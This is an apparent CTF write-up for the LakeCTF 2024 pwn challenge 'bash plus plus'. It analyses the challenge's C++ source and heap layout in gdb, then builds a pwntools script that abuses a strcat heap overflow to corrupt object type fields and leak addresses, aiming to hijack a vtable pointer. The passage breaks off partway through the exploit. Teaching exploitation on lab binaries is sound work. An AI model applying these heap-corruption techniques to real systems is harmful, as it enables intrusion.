## bash plus plus writeup - LakeCTF 2024
Category: pwn

Description: What if you had a shell where you could only do maths?

## Analysis
### Application
Let's look at the security on this binary:
```
$ checksec --file=main
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   270 Symbols	  No	0		2		main
```
We can see that there are stack canaries, the stack is not executable, and the address of the functions are not static.
### Source code
#### Win function
Last things first, there is a `win` function in the source code:
```cpp
void win() {
    system("cat flag.txt");
    exit(0);
}
```
We can deduce that the goal of the challenge will be to execute this function.
#### Log class
```cpp
class Log {
    private:
        int size;
        char logs[MAX_LOG_SIZE];

    public:
        Log() {
            size = 0;
            memset(logs, 0, MAX_LOG_SIZE);
        }

        int get_size() {
            return size;
        }

        void increase_size() {
            size++;
        }

        void add_cmd_to_log(const char* cmd) {
            strcat(logs, cmd);
        }

        void reset_log() {
            memset(logs, 0, MAX_LOG_SIZE);
            size = 0;
        }
};
```
There is a buffer overflow in the function `add_cmd_to_log`. If `cmd` is longer than the remaining bytes in `logs`, the data will overflow. As `Log` is only allocated on the heap, this overflow will let us corrupt the heap.
#### Variable class
```cpp
enum TYPE {
    LONG,
    STRING
};

class Variable {
    public:
        TYPE type;
        union {
            long l;
            char* s;
        } value;
        
        Variable(long l) : type(LONG) {
            value.l = l;
        }

        Variable(const char* s) : type(STRING) {
            value.s = strdup(s);
        }

        virtual void print() {
            std::cout << "Default print" << std::endl;
        }
};

class longVariable : public Variable {
    public:
        longVariable(long l) : Variable(l) {}
        void print() override {
            std::cout << value.l << std::endl;
        }
};

class stringVariable : public Variable {
    public:
        stringVariable(const char* s) : Variable(s) {}
        void print() override {
            std::cout << value.s << std::endl;
        }
};
```
It is interesting to see that there are a `type` field, but this field is not used to determine how to display the `value`. Instead, the `print()` method is virtual, and an instance of `longVariable` or `stringVariable` is created, depending on the type used to construct `Variable`. As this method is virtual, it is important to note that any instance of `Variable` will contain a pointer to the `print` method to execute. Again, all `Variable` instances will be allocated on the heap, so we can imagine modifying a pointer of an instance of `Variable` using the heap buffer overflow in `Log`.
#### Variable manipulation functions
```cpp
std::map<std::string, Variable*> variables;

void setvar(const char* name, const char* p) {
    char *strval;
    long longval = std::strtol(p + 1, &strval, 10);

    if (*strval) {
        variables[name] = new stringVariable(strval);
    } else {
        variables[name] = new longVariable(longval);
    }

    variables[name]->print();
}

Variable* getvarbyname(const char* name) {
    if (variables.find(name) != variables.end()) {
        return variables[name];
    } else {
        std::cout << "Variable not found" << std::endl;
        return 0;
    }
}

long getLongVar(const char* name) {
    Variable* v = getvarbyname(name);
    if (v->type == LONG) {
        return v->value.l;
    } else {
        std::cout << "Invalid variable " << name << ": " << v->value.s << std::endl;
        return 0;
    }
}
```
A `map` is declared as a global object (so we won't be able to corrupt it), but it will contain a pointer to `Variable` that will be on the heap. Indeed, the function `setvar` create a new instance of a `Variable` at each call, and prints its value. It is also possible to check if a `Variable` exists using its name. Finally, it is possible to retrieve the value of a `longVariable` using `getLongVar`. It is interesting to note that, if the variable is not a `longVariable`, the name and the value of the `Variable` is displayed.
#### process_arithmetic function
```cpp
void process_arithmetic(char* cmd) {
    char *p = std::strchr(cmd, ')');

    if (!p) {
        std::cout << "Invalid command" << std::endl;
        return;
    }

    *p = 0;

    char *op = std::strchr(cmd, '+');
    long a, b;
    if (op) {
        *op = 0;
        a = getLongVar(cmd+1);
        b = getLongVar(op + 2);
        std::cout << a + b << std::endl;
    } else {
        /* ... */
    }
}
```
This function can be interesting to print the value of a `longVariable`.
#### main function
```cpp
int main() {
    Log *log = new Log();
    log -> reset_log();
    variables = std::map<std::string, Variable*>();
    while (true) {
        std::cout << "> ";
        char cmd[20];
        std::cin >> cmd;

        if (cmd[0] == '$') {
            if (cmd[1] == '(' && cmd[2] == '(') {
                process_arithmetic(cmd + 3);
            } else {
                char* p = std::strchr(cmd, '=');
                if (p) {
                    *p = 0;
                    setvar(cmd + 1, p);
                } else {
                    Variable* c_v = getvarbyname(cmd + 1);
                    c_v -> print();
                }
            }
        } else if (!strcmp(cmd, "log")) {
            std::cout << "Creating new log" << std::endl;
            log = new Log();
        } else {
            std::cout << cmd << std::endl;
        }

        if (log->get_size() >= MAX_LOG_SIZE) {
            log->reset_log();
        }
        log->add_cmd_to_log(cmd);
        log->increase_size();
    }

    return 0;
}
```
As said before, the `log` will be allocated on the heap, and it is possible to create a new `log` with the command `log`. This is an infinite loop so, even if there is an overflow in `std::cin >> cmd`, it will not be possible to exploit it. Moreover, there are canaries to prevent to exploitation of the stack. This function can be used to create new `Variable`, and to display their content.
### Automated analysis
I have been able to identify the vulnerabilities by reading the source code. However, it is also possible to do the same using AddressSanitizer, but you should keep in mind that you won't be able to spot all vulnerabilities using it. The first step is to build the source code using `-fsanitize=address` option. I also use the `-g` option to get more information in the messages:
```
$ g++ -o test main.cpp -g -fsanitize=address
```
Then, you can run the program and identify the stack overflow:
```
$ ./test 
> long_command_that_will_overflow
=================================================================
==4051==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffd369f9074 at pc 0x7fc2c884a731 bp 0x7ffd369f8fe0 sp 0x7ffd369f8790
READ of size 32 at 0x7ffd369f9074 thread T0
    #0 0x7fc2c884a730 in __interceptor_strlen ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:389
    #1 0x7fc2c8530bcc in std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*) (/lib/x86_64-linux-gnu/libstdc++.so.6+0x130bcc)
    #2 0x55c0ed21c77f in main /home/pierre/Documents/ctf/lakectf/bash_plus_plus/main.cpp:189
    #3 0x7fc2c8246249 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #4 0x7fc2c8246304 in __libc_start_main_impl ../csu/libc-start.c:360
    #5 0x55c0ed21b450 in _start (/home/pierre/Documents/ctf/lakectf/bash_plus_plus/test+0x3450)

Address 0x7ffd369f9074 is located in stack of thread T0 at offset 68 in frame
    #0 0x55c0ed21c360 in main /home/pierre/Documents/ctf/lakectf/bash_plus_plus/main.cpp:189. 

  This frame has 2 object(s):
    [48, 68) 'cmd' (line 169) <== Memory access at offset 68 overflows this variable
    [112, 160) '<unknown>'
```
We can see that a stack buffer overflow occurs, and it is about the `cmd` variable.

You can also spot the heap buffer overflow:
```
$ ./test 
> $long_variable=2
2
=================================================================
==4445==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000020 at pc 0x7f9e956486f8 bp 0x7ffdf7f94f60 sp 0x7ffdf7f94710
WRITE of size 15 at 0x602000000020 thread T0
    #0 0x7f9e956486f7 in __interceptor_strcat ../../../../src/libsanitizer/asan/asan_interceptors.cpp:377
    #1 0x563e86cabdcc in Log::add_cmd_to_log(char const*) /home/pierre/Documents/ctf/lakectf/bash_plus_plus/main.cpp:27
    #2 0x563e86cab7d2 in main /home/pierre/Documents/ctf/lakectf/bash_plus_plus/main.cpp:195
    #3 0x7f9e95446249 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #4 0x7f9e95446304 in __libc_start_main_impl ../csu/libc-start.c:360
    #5 0x563e86caa450 in _start (/home/pierre/Documents/ctf/lakectf/bash_plus_plus/test+0x3450)

0x602000000020 is located 0 bytes to the right of 16-byte region [0x602000000010,0x602000000020)
allocated by thread T0 here:
    #0 0x7f9e956b94c8 in operator new(unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cpp:95
    #1 0x563e86cab3ee in main /home/pierre/Documents/ctf/lakectf/bash_plus_plus/main.cpp:164
    #2 0x7f9e95446249 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
```
This time, you can see that a heap buffer overflow occurs in the function `add_cmd_to_log` at line 27 on the statement: `strcat(logs, cmd);`.
## Memory analysis
To be able to exploit the heap overflow, we need to understand how each object is represented in the heap. We will gdb with [GEF](https://github.com/hugsy/gef) for that.
### Log object
When the program starts a `Log` object is created before the first prompt. Let's put a breakpoint at the `new Log` instruction and look into the heap:
```
$ gdb main
GNU gdb (Debian 13.1-3) 13.1
[...]
# Set a breakpoint at line 164, just before the new instruction
gef➤  b 164

# Run the program
gef➤  r
Starting program: /home/pierre/Documents/ctf/lakectf/bash_plus_plus/main 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, main () at main.cpp:164
164	    Log *log = new Log();
```
We can look at the heap chunks already created:
```
gef➤  heap chunks
Chunk(addr=0x55555555e010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555555e010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555555e2a0, size=0x11c10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555555e2a0     00 1c 01 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555556feb0, size=0xf160, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```
We can see there is already two chunks in memory. I did not analyze them in details, so I won't talk too much about it to avoid saying mistakes, but it seems to be related to the `std::map` created before the `main`.

Now, let's run the next instructions and look at the chunk created for the log object:
```
gef➤  n
165	    log -> reset_log();
gef➤  heap chunks
Chunk(addr=0x55555555e010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555555e010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555555e2a0, size=0x11c10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555555e2a0     00 1c 01 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555556feb0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555556feb0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555556fed0, size=0xf140, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```
We can see that a new chunk of size `0x20` has been created at address `0x55555556feb0`. Let's look at the content of this chunk in details:
```
gef➤  x/8wx 0x55555556feb0
0x55555556feb0:	0x00000000	0x00000000	0x00000000	0x00000000
0x55555556fec0:	0x00000000	0x00000000	0x0000f141	0x00000000
```
Currently, it is empty, but using the code, we already know that the first word corresponds to the `size` variable and represents the number of commands that have been logged in the `log` object. The next 10 bytes represents the log content. Then, there are 18 bytes of padding until `0x0000f141` which represents the size of the next chunk. Finally, the last word `0x00000000` represents some flags about the heap state. We will not use this information here.

We can check that by adding a first command in the log. Let's add a breakpoint just at the end of the `while` loop to see the impact of each command on the heap:
```
gef➤  b 197
Breakpoint 2 at 0x555555557001: file main.cpp, line 197.
gef➤  c
Continuing.
> command
command

Breakpoint 2, main () at main.cpp:197
197	    }
gef➤  x/8wx 0x55555556feb0
0x55555556feb0:	0x00000001	0x6d6d6f63	0x00646e61	0x00000000
0x55555556fec0:	0x00000000	0x00000000	0x00000411	0x00000000
```
We can see that the first word is now `0x00000001`. Indeed, the `size` increased by one because we made one command. Then, we have our command. We can display it as a string if we want:
```
gef➤  x/s 0x55555556feb4
0x55555556feb4:	"command"
```
We can also note that the size of the next chunk changed to `0x00000411`. This is because `std::cout` and `std::in` create buffers on the heap for their operations:
```
gef➤  heap chunks
Chunk(addr=0x55555555e010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555555e010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555555e2a0, size=0x11c10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555555e2a0     00 1c 01 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555556feb0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555556feb0     01 00 00 00 63 6f 6d 6d 61 6e 64 00 00 00 00 00    ....command.....]
Chunk(addr=0x55555556fed0, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555556fed0     63 6f 6d 6d 61 6e 64 0a 00 00 00 00 00 00 00 00    command.........]
Chunk(addr=0x5555555702e0, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555702e0     63 6f 6d 6d 61 6e 64 0a 00 00 00 00 00 00 00 00    command.........]
Chunk(addr=0x5555555706f0, size=0xe920, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```
We will not look at them in details, but it is important to know there are in the heap if we want to manipulate it.
### Variable object
Each time we create a new variable, it will be created on the heap. Let's look at this, but before, we will call the `log` command to create a new log on the heap. Indeed, we do not want a heap overflow for now and we already added 7 characters in the log, and the log size is only 10 characters:
```
gef➤  c
Continuing.
> log
Creating new log

Breakpoint 2, main () at main.cpp:197
197	    }
gef➤  heap chunks
Chunk(addr=0x55555555e010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555555e010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555555e2a0, size=0x11c10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555555e2a0     00 1c 01 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555556feb0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555556feb0     01 00 00 00 63 6f 6d 6d 61 6e 64 00 00 00 00 00    ....command.....]
Chunk(addr=0x55555556fed0, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055555556fed0     43 72 65 61 74 69 6e 67 20 6e 65 77 20 6c 6f 67    Creating new log]
Chunk(addr=0x5555555702e0, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555702e0     6c 6f 67 0a 61 6e 64 0a 00 00 00 00 00 00 00 00    log.and.........]
Chunk(addr=0x5555555706f0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555706f0     01 00 00 00 6c 6f 67 00 00 00 00 00 00 00 00 00    ....log.........]
Chunk(addr=0x555555570710, size=0xe900, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```
We can see that a new chunk has been created at address `0x5555555706f0`:
```
gef➤  x/8wx 0x5555555706f0
0x5555555706f0:	0x00000001	0x00676f6c	0x00000000	0x00000000
0x555555570700:	0x00000000	0x00000000	0x0000e901	0x00000000
```
It represents the new `log` we created. It already has a size of 1, and contains the previous command `log`.

Let's now create a new variable:
```
gef➤  c
Continuing.
> $var=2
2

Breakpoint 2, main () at main.cpp:197
197	    }
gef➤  heap chunks
[...]
Chunk(addr=0x5555555706f0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)]
    [0x00005555555706f0     02 00 00 00 6c 6f 67 24 76 61 72 00 00 00 00 00    ....log$var.....]
Chunk(addr=0x555555570710, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555570710     e8 cb 55 55 55 55 00 00 00 00 00 00 00 00 00 00    ..UUUU..........]
Chunk(addr=0x555555570730, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555570730     01 00 00 00 00 00 00 00 88 d2 55 55 55 55 00 00    ..........UUUU..]
Chunk(addr=0x555555570780, size=0xe890, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```
We can see that two new chunks have been created. The first one, of size `0x20` corresponds to our new variable:
```
gef➤  x/8wx 0x0000555555570710
0x555555570710:	0x5555cbe8	0x00005555	0x00000000	0x00000000
0x555555570720:	0x00000002	0x00000000	0x00000051	0x00000000
```
As said previously, the first bytes of a polymorphic object correspond to the address of the address of the `print` function to call (yes, I did not dig into this yet, but just keep in mind that this address points into another pointer). Here, `0x000055555555cbe8` points to the `print` of the `longVariable`:
```
gef➤  x/gx 0x000055555555cbe8
0x55555555cbe8 <_ZTV12longVariable+16>:	0x00005555555573be
gef➤  x/i 0x00005555555573be
   0x5555555573be <_ZN12longVariable5printEv>:	endbr64
```
You can see that the two first words of our new `variable` object points to `0x00005555555573be` which then corresponds to the first instruction of the `print` function of `longVariable`: `_ZN12longVariable5printEv` is the mangle name of the function.

Then, the next byte corresponds to the `TYPE` of the variable. Here, it is a long, so it is zero, but it would have been 1 if we had created a string:
```
gef➤  x/wx 0x555555570718
0x555555570718:	0x00000000
```
Finally, before the size of the next chunk, we have the value of our `longVariable` (I displayed it using 8 bytes because it is a `long`, not an `int`):
```
gef➤  x/gx 0x555555570720
0x555555570720:	0x0000000000000002
```
### Pair object
The other chunks created in the previous operation corresponds to the pair created when storing the `longVariable` into the `variables` map:
```
gef➤  x/10gx 0x555555570730
0x555555570730:	0x0000000000000001	0x000055555555d288
0x555555570740:	0x0000000000000000	0x0000000000000000
0x555555570750:	0x0000555555570760	0x0000000000000003
0x555555570760:	0x0000000000726176	0x0000000000000000
0x555555570770:	0x0000555555570710	0x000000000000e891
```
I won't go into to many details here, but we can see that it contains the key of the map which is an `std::string` at `0x555555570750`, and a pointer to the variable we created at `0x555555570770`.
### stringVariable object
Let's now look at what happens if we created a `stringVariable` object. First, we create a new log, and then, we create the new variable:
```
gef➤  c
Continuing.
> log
Creating new log
[...]
> $other=str
str

Breakpoint 2, main () at main.cpp:197
197	    }
gef➤  heap chunks
Chunk(addr=0x555555570780, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555570780     02 00 00 00 6c 6f 67 24 6f 74 68 65 72 00 00 00    ....log$other...]
Chunk(addr=0x5555555707a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555707a0     d0 cb 55 55 55 55 00 00 01 00 00 00 00 00 00 00    ..UUUU..........]
Chunk(addr=0x5555555707c0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555707c0     73 74 72 00 00 00 00 00 00 00 00 00 00 00 00 00    str.............]
Chunk(addr=0x5555555707e0, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555707e0     00 00 00 00 00 00 00 00 30 07 57 55 55 55 00 00    ........0.WUUU..]
Chunk(addr=0x555555570830, size=0xe7e0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```
We can see the log chunk at `0x555555570780`, the `variable` chunk at `0x5555555707a0` and the pair chunk at `0x5555555707e0`. However, a new chunk has been created at `0x5555555707c0`. It corresponds to the content of the new `stringVariable` created with the `strdup` function.

Let's now look at what changed in the `variable` chunk:
```
gef➤  x/4gx 0x5555555707a0
0x5555555707a0:	0x000055555555cbd0	0x0000000000000001
0x5555555707b0:	0x00005555555707c0	0x0000000000000021
```
The first pointer is different because it points now to the `print` function of the `stringVariable` class. The next double word is 1 because it is a string. And the last pointer points to the string created with `strdup`.
## Exploitation
Because of the heap overflow of the `log`, we know that we can write over any of the other chunks in the heap. Let's see the consequences of each overwrite.
### `print` pointer
In the variable object, we can overwrite the pointer to the `print` object. We can already identify our ultimate goal: modifying this pointer to point to a pointer to the `win` function. However, we do not know what is the address of the `win` function... for now.
### Type of the variable object
We can overwrite the type of a `Variable` object. We can change a `long` type to a `string` type and vice-versa. This is interesting because the `getLongVar` function uses this information to get the value of the object:
```cpp
    if (v->type == LONG) {
        return v->value.l;
    } else {
        std::cout << "Invalid variable " << name << ": " << v->value.s << std::endl;
        return 0;
    }
```
If the object is of type `LONG`, it returns the value. Otherwise, it displays the content pointed by the `value` field, without using the `print` function! This point is important because we need to overwrite the pointer to `print` to modify the value of the type. Also, if we are able to change a string type to a long type, we will be able to get an absolute address in the heap of the string created by `strdup`. We will see how to do this in a next section.
### Value of the variable object
By modifying the value of the variable object, you will be able to print anything you want from the heap. Indeed, let's say you got an address from the heap using the previous technique (let's say 0x00005555555707c0 that corresponds), you can now add an offset to this value to print the address of a `print` pointer.
### Plan
We now have enough vulnerabilities to exploit this binary:
1. Get the address of a string in the heap
2. Using this address, compute the address of a `print` pointer
3. Modify the value of a variable object with the address of the `print` pointer
4. Display this variable using the `getLongVar` function: we get an address in the code section of the program
5. From the address from the code section, we can compute the address of the `win` function
6. Modify the address of the `print` function of a variable to point to a pointer to the `win` function
7. Call the `print` method of this modified variable: we get your flag!
## Exploit
Note: in the examples provided here, the absolute addresses from gdb can change from one example to another because I run the script multiple times to make these examples.
### Heap address
The first step is to get an address from the heap. For that, we will create a `stringVariable` to have an address that points to the heap, we will overwrite the type of this variable to make it a long, then, we will print the value of the variable through `getLongVar` function to avoid using `print` which is now overwritten by some garbage:
```py
import pwn

file = "./main"
conn = pwn.process(file)

# Create a first longVariable with value zero
# It will be used to display the content of other variables
# using process_arithmetic function
r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$z=0\n')

# Each time we want to make an overwrite, we create a new log
# to avoid being polluted by the previous commands
r = conn.recvuntil(b'> ')
print(r)
conn.send(b'log\n')

# We create now a stringVariable that we will overwrite to
# get an address to the heap
r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$var=str\n')
```
Let's now analyze the heap of the program. For that, we need to add `conn.interactive()` at the end of the python script and run it:
```
$ python3 pwn_bashpp.py 
[+] Starting local process './main': pid 3422
[*] './main'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'> '
b'0\n> '
b'Creating new log\n> '
[*] Switching to interactive mode
str
```
The process has been created with pid 3422. We will use it to attach the debugger to it:
```
$ gdb -p 3422
GNU gdb (Debian 13.1-3) 13.1
[...]
gef➤  heap chunks
Chunk(addr=0x55eae6026010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055eae6026010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55eae60262a0, size=0x11c10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055eae60262a0     00 1c 01 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55eae6037eb0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055eae6037eb0     01 00 00 00 24 7a 00 00 00 00 00 00 00 00 00 00    ....$z..........]
Chunk(addr=0x55eae6037ed0, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055eae6037ed0     3e 20 72 0a 74 69 6e 67 20 6e 65 77 20 6c 6f 67    > r.ting new log]
Chunk(addr=0x55eae60382e0, size=0x1010, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055eae60382e0     24 76 61 72 3d 73 74 72 0a 00 00 00 00 00 00 00    $var=str........]
Chunk(addr=0x55eae60392f0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055eae60392f0     e8 2b 4a e2 ea 55 00 00 00 00 00 00 00 00 00 00    .+J..U..........]
Chunk(addr=0x55eae6039310, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055eae6039310     01 00 00 00 00 00 00 00 88 32 4a e2 ea 55 00 00    .........2J..U..]
Chunk(addr=0x55eae6039360, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055eae6039360     02 00 00 00 6c 6f 67 24 76 61 72 00 00 00 00 00    ....log$var.....]
Chunk(addr=0x55eae6039380, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055eae6039380     d0 2b 4a e2 ea 55 00 00 01 00 00 00 00 00 00 00    .+J..U..........]
Chunk(addr=0x55eae60393a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055eae60393a0     73 74 72 00 00 00 00 00 00 00 00 00 00 00 00 00    str.............]
Chunk(addr=0x55eae60393c0, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055eae60393c0     00 00 00 00 00 00 00 00 10 93 03 e6 ea 55 00 00    .............U..]
Chunk(addr=0x55eae6039410, size=0xdc00, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```
In the stack, we have:
* the two chunks created at the beginning of the program
* the first log chunk that contains the command `$z` that we run at first
* the two `std::cin` and `std::cout` buffers
* the `longVariable` named `z` with value 0
* the pair in the `variables` map for the `z` variable
* the second log that we will overflow in the next command (note the address `0x55eae6039360`)
* the variable object that we will overwrite in the next command
* the memory allocated to store the content of the `var` variable
* the pair in the `variables` map for the `var` variable

The part of this stack that interests us is the second log and the `str` variable object. Let's look to them more closely:
```
gef➤  x/16wx 0x55eae6039360
0x55eae6039360:	0x00000002	0x24676f6c	0x00726176	0x00000000
0x55eae6039370:	0x00000000	0x00000000	0x00000021	0x00000000
0x55eae6039380:	0xe24a2bd0	0x000055ea	0x00000001	0x00000000
0x55eae6039390:	0xe60393a0	0x000055ea	0x00000021	0x00000000
```
Now, let's imagine what we want (I put an `X` for every garbage values):
```
gef➤  x/16wx 0x55eae6039360
0x55eae6039360:	0x00000002	0x24676f6c	0xXX726176	0xXXXXXXXX
0x55eae6039370:	0xXXXXXXXX	0xXXXXXXXX	0xXXXXXXXX	0xXXXXXXXX
0x55eae6039380:	0xXXXXXXXX	0xXXXXXXXX	0x00000000	0x00000000
0x55eae6039390:	0xe60393a0	0x000055ea	0x00000021	0x00000000
```
Two things changed here: we add some garbage characters from the end of the last command in the log to the end of the `print` address of the `var` variable. And, the type changed from 1 to 0. As the end of a string is marked with the NULL byte, we can create a command of size 29 (which corresponds to the number of bytes marked `XX`) and this will set the type to 0:
```
r = conn.recvuntil(b'> ')
print(r)
conn.send(b'X'*29+b'\n')
```
Now, if we look at the heap, we have:
```
gef➤  heap chunks
[...]
    [0x0000557fb49ab360     03 00 00 00 6c 6f 67 24 76 61 72 58 58 58 58 58    ....log$varXXXXX]
Chunk(addr=0x557fb49ab380, size=0x5858585858585858, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000557fb49ab380     58 58 58 58 58 58 58 58 00 00 00 00 00 00 00 00    XXXXXXXX........]
```
First, note that, as we erased the size of the next chunk in the log chunk, the view of the chunks is totally destroyed. Whatever, the memory is still organized the same, and we know that a log chunk is `0x20` bytes like a variable chunk:
```
gef➤  x/16wx 0x557fb49ab360
0x557fb49ab360:	0x00000003	0x24676f6c	0x58726176	0x58585858
0x557fb49ab370:	0x58585858	0x58585858	0x58585858	0x58585858
0x557fb49ab380:	0x58585858	0x58585858	0x00000000	0x00000000
0x557fb49ab390:	0xb49ab3a0	0x0000557f	0x00000021	0x00000000
```
Bingo! We overwrite the type of the variable. Let's now look what happens when we try to print the value of this variable:
```
# Create a new log to avoid continuing
# to overwrite the log chunks
r = conn.recvuntil(b'> ')
print(r)
conn.send(b'log\n')

# Add $var to $z to display only $var
r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$(($var+$z))\n')

# Get the content of $var
r = conn.recvuntil(b'> ')
print(r)
```
When we run the script, we can see that a large number is printed at the end:
```
b'93954791658400\n> '
```
This number corresponds to the address of `str` in the heap. Let's check this using gdb:
```
gef➤  x/24wx 0x55738dfb5360
0x55738dfb5360:	0x00000003	0x24676f6c	0x58726176	0x58585858
0x55738dfb5370:	0x58585858	0x58585858	0x58585858	0x58585858
0x55738dfb5380:	0x58585858	0x58585858	0x00000000	0x00000000
0x55738dfb5390:	0x8dfb53a0	0x00005573	0x00000021	0x00000000
0x55738dfb53a0:	0x00727473	0x00000000	0x00000000	0x00000000 <- we have leaked this address
0x55738dfb53b0:	0x00000000	0x00000000	0x00000051	0x00000000
```
Here are the three chunks from the log chunk. So we can see that the `0x58` that corresponds to our `X`, the type that has been erased at address `0x55738dfb5388`, and the address of the string in the variable which is `0x000055738dfb53a0`. If we convert this address in decimal, we get `93954791658400` which is the value printed by the program.
### Compute address of `print` pointer
What we would like is to leak the address pointed by a `print` pointer to get a pointer to the code section. First, we need to compute where one of this pointer is located into memory. We have one pointer per variable object. As we already created two variables, we should have two pointers. However, we overwrote the pointer of the variable `$var`. But we still can compute the address of the pointer of the variable `$z`. Let's look again at the heap from the first log:
```
gef➤  heap chunks
[...]
Chunk(addr=0x55738dfb3eb0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055738dfb3eb0     01 00 00 00 24 7a 00 00 00 00 00 00 00 00 00 00    ....$z..........] <- first log
Chunk(addr=0x55738dfb3ed0, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055738dfb3ed0     3e 20 39 35 34 37 39 31 36 35 38 34 30 30 0a 67    > 954791658400.g] <- std::cin buffer
Chunk(addr=0x55738dfb42e0, size=0x1010, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055738dfb42e0     24 28 28 24 76 61 72 2b 24 7a 29 29 0a 58 58 58    $(($var+$z)).XXX] <- std::cout buffer
Chunk(addr=0x55738dfb52f0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055738dfb52f0     e8 cb 7f 68 73 55 00 00 00 00 00 00 00 00 00 00    ...hsU..........] <- $z variable
